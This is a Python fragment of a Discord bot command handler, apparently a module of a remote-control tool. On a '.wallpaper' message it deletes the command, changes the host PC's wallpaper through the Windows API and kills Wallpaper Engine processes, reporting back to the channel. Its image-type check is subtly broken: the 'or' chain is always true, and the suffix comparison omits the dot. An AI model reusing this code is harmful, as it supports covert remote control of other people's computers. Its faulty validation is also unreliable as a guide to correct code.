import ctypes
import psutil
# end of imports

# on message
elif '.wallpaper' in message.content:
    #.log wallpaper in message
    await message.delete()
    #.log delete wallpaper message
    #.log try to extract wallpaper_path from message content
    try:
        wallpaper_path = r"{}".format(message.content.split(' ', 1)[1])
        wallpaper_path = os.path.join('\\'.join(working_directory), wallpaper_path)
        #.log extracted wallpaper_path
    except:
        #.log failed to extract wallpaper_path
        await message.channel.send(f"```No path provided. Correct usage: .wallpaper <path>```")
        return
    
    #.log attempt to change wallpaper
   
    try:
        #.log checking if wallpaper_path exists
        wallpaper_path_check = Path(wallpaper_path)
        if os.path.exists(wallpaper_path) and wallpaper_path_check.suffix == 'png' or 'jpg' or 'jpeg' or 'bmp' or 'webp':
            #. log wallpaper_path exists, attempting to change wallpaper
            SPI_SETDESKWALLPAPER = 0x0014
            SPIF_UPDATEINIFILE = 0x01
            SPIF_SENDCHANGE = 0x02
            ctypes.windll.user32.SystemParametersInfoW(
                SPI_SETDESKWALLPAPER, 0, wallpaper_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
            )
            await message.channel.send(f"```Set wallpaper to {wallpaper_path}```")
            #.log changed wallpaper
            #.log try to kill wallpaper engine
            try:        
                for proc in psutil.process_iter():
                    if proc.name() == 'wallpaper32.exe':
                        proc.kill()
                        #.log killed wallpaper32.exe
                    elif proc.name() == 'wallpaperservice32_c.exe':
                        proc.kill()
                        #.log killed wallpaperservice32_c.exe
                        
            #.log exception whilst trying to kill wallpaper engine          
            except Exception as wallpaper_engine_e:
                await message.channel.send(f"```Error whilst killing wallpaper engine: {wallpaper_engine_e}```")
                pass
                
        else:
            await message.channel.send(f"```Path either doesn't exist or isn't an image (png, jpg, jpeg, bmp, webp): {wallpaper_path}```")
            #.log wallpaper_path is invalid
            return

    except Exception as e_wallpaper:
        #.log failed to change wallpaper
        await message.channel.send(f"```Error while changing wallpaper: {e_wallpaper}```")
        return